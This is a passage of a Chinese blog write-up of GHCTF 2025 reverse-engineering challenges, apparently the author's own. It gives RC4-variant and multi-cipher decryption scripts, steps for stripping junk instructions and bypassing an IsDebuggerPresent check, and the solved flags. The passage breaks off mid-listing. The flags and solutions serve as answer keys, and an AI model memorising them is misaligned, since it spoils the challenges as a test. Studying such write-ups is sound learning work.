text"></p><p>附：v18是从a2数据转换得来，a2数据实际是触发异常的时候通过栈进行获取异常前数据，实际数据是触发异常时候的v6值，传过来到enc段函数当作密钥进行加密。</p><p><img src="/2025/03/06/GHCTF2025WP/54.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/55.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *a, <span class="type">unsigned</span> <span class="type">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        sbox[i] = i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> keyLen = <span class="built_in">strlen</span>((<span class="type">char</span> *)key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Ttable[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        Ttable[i] = key[i % keyLen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + sbox[i] + Ttable[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> data[], <span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k, i = <span class="number">0</span>, j = <span class="number">0</span>, t;</span><br><span class="line">    <span class="built_in">init_sbox</span>(key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dataLen = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> h = <span class="number">0</span>; h &lt; dataLen; h++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + sbox[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">        t = (sbox[i] + sbox[j]) % <span class="number">256</span>;</span><br><span class="line">        k = sbox[t];</span><br><span class="line">        data[h] ^= k ^ key[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 两个数组最后的0x00都当作截止符，让strlen调用的时候正常返回长度。</span></span><br><span class="line">    <span class="type">uint8_t</span> enc[]&#123;<span class="number">0x22</span>, <span class="number">0xC4</span>, <span class="number">0xA0</span>, <span class="number">0x5A</span>, <span class="number">0xDE</span>, <span class="number">0xED</span>, <span class="number">0x62</span>, <span class="number">0x5E</span>, <span class="number">0x25</span>, <span class="number">0xE2</span>, <span class="number">0x6D</span>, <span class="number">0xA6</span>, <span class="number">0x05</span>, <span class="number">0xA7</span>, <span class="number">0x20</span>, <span class="number">0x8D</span>, <span class="number">0x7D</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0x3E</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0x7F</span>, <span class="number">0xFA</span>, <span class="number">0x09</span>, <span class="number">0xD8</span>, <span class="number">0x62</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0xC2</span>, <span class="number">0xA9</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> key[]&#123;<span class="number">0xD4</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0xF8</span>, <span class="number">0xF8</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="built_in">RC4</span>(enc, key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-5"><a href="#Flag值-5" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Int3r3st1ng_5MC_Pr0gr@m?&#125;</code></p><h2 id="Canon"><a href="#Canon" class="headerlink" title="Canon"></a>Canon</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>IDA分析main函数，发现是将输入的字符串分成3份，在循环里面互为密钥进行循环加密，并且利用a3数组数据传入调用不同的加密。</p><p>可以看到加密函数里面有多个case，但由于a3数组里面数字是有限的，只出现了13456，2和7加密没有用到，所以不用分析那两个case。</p><p><img src="/2025/03/06/GHCTF2025WP/84.png" alt="alt text"></p><p>case1：凯撒加密</p><p><img src="/2025/03/06/GHCTF2025WP/85.png" alt="alt text"></p><p>case3：栅栏加密</p><p><img src="/2025/03/06/GHCTF2025WP/86.png" alt="alt text"></p><p>case4：字符串位移</p><p><img src="/2025/03/06/GHCTF2025WP/87.png" alt="alt text"></p><p>case5：异或加密 + Base64</p><p><img src="/2025/03/06/GHCTF2025WP/88.png" alt="alt text"></p><p>case6：变种RC4 + Base64</p><p><img src="/2025/03/06/GHCTF2025WP/89.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/90.png" alt="alt text"></p><p>注意，Base64的表是被换过的，可以查找交叉调用发现，可以直接动调获取到换后的表。</p><p><img src="/2025/03/06/GHCTF2025WP/91.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/92.png" alt="alt text"></p><p>main函数执行加密的双循环中用到的加密方式数值和加密顺序都可以通过模拟循环来得到，然后逆向就是解密调用的函数顺序和密文顺序。</p><p>解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">new_table = <span class="string">&quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    key = key.encode()</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    plaintext = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        plaintext.append(((byte - <span class="number">0x39</span>) ^ k) % <span class="number">256</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replay</span>(<span class="params">violin, bass, mode</span>):</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(violin):</span><br><span class="line">            offset = <span class="built_in">ord</span>(bass[i % <span class="built_in">len</span>(bass)])</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - offset) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += violin[i]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">3</span>:</span><br><span class="line">            Ek = <span class="built_in">ord</span>(bass[<span class="number">0</span>]) % <span class="number">10</span> + <span class="number">2</span></span><br><span class="line">            Dk = <span class="built_in">int</span>(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">            res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            yushu = <span class="built_in">len</span>(violin) % Ek</span><br><span class="line">            steps = []</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(violin) % Ek == <span class="number">0</span>:</span><br><span class="line">                step = Dk</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Ek):</span><br><span class="line">                    steps.append(step)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                big_step = math.ceil(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">                small_step = <span class="built_in">int</span>(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(yushu):</span><br><span class="line">                    steps.append(big_step)</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(Ek - yushu):</span><br><span class="line">                    steps.append(small_step)</span><br><span class="line"></span><br><span class="line">            n_column = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> n_column &lt; math.ceil(<span class="built_in">len</span>(violin) / Ek):</span><br><span class="line">                count_steps = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> one_step <span class="keyword">in</span> steps:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="built_in">len</span>(violin):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        res += violin[n_column + count_steps]</span><br><span class="line">                        count_steps += one_step</span><br><span class="line">                n_column += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">4</span>:</span><br><span class="line">        step = <span class="built_in">ord</span>(bass[<span class="number">0</span>]) % <span class="number">10</span> + <span class="number">2</span></span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        res += violin[step:]</span><br><span class="line">        res += violin[:step]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">5</span>:</span><br><span class="line">        violin_decode = base64.b64decode(violin.translate(<span class="built_in">str</span>.maketrans(new_table, old_table)))</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(violin_decode):</span><br><span class="line">            res += <span class="built_in">chr</span>(char ^ <span class="built_in">ord</span>(bass[i % <span class="built_in">len</span>(bass)]) + <span class="number">0x39</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">6</span>:</span><br><span class="line">        violin_byte = base64.b64decode(violin.translate(<span class="built_in">str</span>.maketrans(new_table, old_table)))</span><br><span class="line">        res = rc4_decrypt(violin_byte, bass)</span><br><span class="line">        <span class="keyword">return</span> res.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    violin = [<span class="string">&quot;WgvDmssEvcY326bHo3nNro3vXvvfmgrz&quot;</span>, <span class="string">&quot;gX+Ri9PG=bt5=00B6hscPQOL&quot;</span>, <span class="string">&quot;T6bHgUPL2gXUd=xT=FNHtPzV&quot;</span>]</span><br><span class="line">    v = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">    chord = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        tmp = replay(violin[v[i] - <span class="number">1</span>], violin[v[i] % <span class="number">3</span>], chord[i])</span><br><span class="line">        violin[v[i] - <span class="number">1</span>] = tmp</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(violin))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Flag值-6"><a href="#Flag值-6" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;P4ch3Lbel&#39;s_C@n0n_1n_D_mAjOr&#125;</code></p><h2 id="腐蚀"><a href="#腐蚀" class="headerlink" title="腐蚀"></a>腐蚀</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>IDA分析main函数，发现开头程序要读入一个Input.png文件。</p><p><img src="/2025/03/06/GHCTF2025WP/56.png" alt="alt text"></p><p>并且在程序尾部将加密后的数据写到enc文件，输出完成语句。</p><p><img src="/2025/03/06/GHCTF2025WP/57.png" alt="alt text"></p><p>进入这个函数。</p><p><img src="/2025/03/06/GHCTF2025WP/58.png" alt="alt text"></p><p>发现这个函数是一个RC4加密流程，通过0x100特征和一些异或计算可以看出来的。</p><p>并且是变种RC4，最后异或加密的时候多异或上了0x1f。</p><p><img src="/2025/03/06/GHCTF2025WP/59.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/60.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/61.png" alt="alt text"></p><p>我们创建一个Input.png文件，动调程序运行到这个函数断住，a2可以在第二个while循环中看出来，是充当RC4密钥。</p><p>跳到a2地址，发现是一个这样的结构，数据长度+数据指针，数据指针跳过去，这十六个字节就是密钥，发现一些特征，看起来像是PNG文件的开头部分字节和结尾部分字节乱序混在一起，不过不重要，只要动调拿到16字节的key即可。<br>密钥：<code>60 82 AE 42 4E 44 49 45 1A 0A 0D 0A 4E 47 89 50</code></p><p><img src="/2025/03/06/GHCTF2025WP/62.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/63.png" alt="alt text"></p><p>而a3是即将被加密的明文数据，跳过去发现也是同样结构，发现大小是0x30B，和我给的Input.png文件字节数一样，跳过去就会发现就是读入的png文件字节。</p><p><img src="/2025/03/06/GHCTF2025WP/64.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/65.png" alt="alt text"></p><p>从函数尾部的赋值可以看出a1就是加密后数据储存的地方，将该函数执行完返回到main函数，然后跳到a1地址将数据复制出来尝试RC4+Xor解密，发现确实可以解密出原字节，</p><p><img src="/2025/03/06/GHCTF2025WP/66.png" alt="alt text"></p><p>直接执行到write_all即将写出到enc文件处，然后查看v18，v18是通过上面RC4加密返回的v44得到的。</p><p><img src="/2025/03/06/GHCTF2025WP/67.png" alt="alt text"></p><p>发现对比原RC4加密返回的数据，写出的数据做了字节顺序翻转处理。</p><p><img src="/2025/03/06/GHCTF2025WP/68.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/69.png" alt="alt text"></p><p>直接让程序跑起来，写出enc文件，拖入到010Editor中，发现确实是将RC4加密后的数据翻转后再写到的文件。</p><p><img src="/2025/03/06/GHCTF2025WP/70.png" alt="alt text"></p><p>所以解密流程为：读入题目enc附件-&gt;翻转字节-&gt;RC4解密</p><p>Cyberchef：</p><p><img src="/2025/03/06/GHCTF2025WP/71.png" alt="alt text"></p><p>导出图片得到Flag</p><p><img src="/2025/03/06/GHCTF2025WP/72.png" alt="alt text"></p><h3 id="Flag值-7"><a href="#Flag值-7" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Y0u_ar3_ru5t_m@st3r&#125;</code></p><h2 id="ezObfus"><a href="#ezObfus" class="headerlink" title="ezObfus"></a>ezObfus</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>IDA分析程序，发现存在花指令，大部分花指令就以下几种情况，第一种截图区域所有字节都nop，后面几种就跳转地址汇编按u进行undefine，然后再跳过对应字节按c还原汇编代码。</p><p><img src="/2025/03/06/GHCTF2025WP/73.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/74.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/75.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/76.png" alt="alt text"></p><p>去掉main函数几个花指令后按p还原函数进行反编译，发现存在代码混淆，且开头有反调试。</p><p><img src="/2025/03/06/GHCTF2025WP/77.png" alt="alt text"></p><p>直接条件断点在IsDebuggerPresent，将返回值eax设置为0即可跳过反调试。</p><p><img src="/2025/03/06/GHCTF2025WP/78.png" alt="alt text"></p><p>发现代码中有用到一些常数，跳转过来发现是0-9，手动将名字都命名为对应数字，方便分析代码。</p><p><img src="/2025/03/06/GHCTF2025WP/79.png" alt="alt text"></p><p>上图发现for循环最后i是+&#x3D;了一个函数传进去1的返回值，去掉该函数花指令后，可以发现是以下代码，返回的永远是传参的值，也就是1，所以其实这个函数没什么用，直接看参数值就是对应值。</p><p><img src="/2025/03/06/GHCTF2025WP/80.png" alt="alt text"></p><p>然后配合动调，省略去混淆部分代码，抽离出主要核心代码，且所有常量字符串都被加密过的，只能动调获取。</p><p>第一部分key校验代码如下。</p><p><img src="/2025/03/06/GHCTF2025WP/81.png" alt="alt text"></p><p>同理第二部分的Flag校验如下，byte_F1A004就是被加密的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/82.png" alt="alt text"></p><p>去掉加密函数的花指令，然后同样进行动调抽离关键代码。</p><p><img src="/2025/03/06/GHCTF2025WP/83.png" alt="alt text"></p><p>还原出程序完整原始代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *Input, <span class="type">uint32_t</span> Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> InputLen = <span class="built_in">strlen</span>((<span class="type">char</span> *)Input);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; InputLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v26 = i ^ (Key &gt;&gt; ((<span class="number">3</span> - i % <span class="number">4</span>) * <span class="number">8</span>));</span><br><span class="line">        <span class="type">uint8_t</span> v27 = v26 ^ Input[i];</span><br><span class="line">        <span class="type">uint8_t</span> v28 = (v27 &gt;&gt; <span class="number">5</span>) | (v27 * <span class="number">8</span>);</span><br><span class="line">        v28 += i;</span><br><span class="line">        Input[i] = v28;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> Input[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">            v67 = v66 ^ v71;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">        v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">        v66 = v67 - v71;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v66 != <span class="number">1172912374</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(Input); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Input[j] ^= <span class="number">8</span> * (v66 &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Encrypt</span>(Input, Key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过爆破得到目标Key</p><p>爆破代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 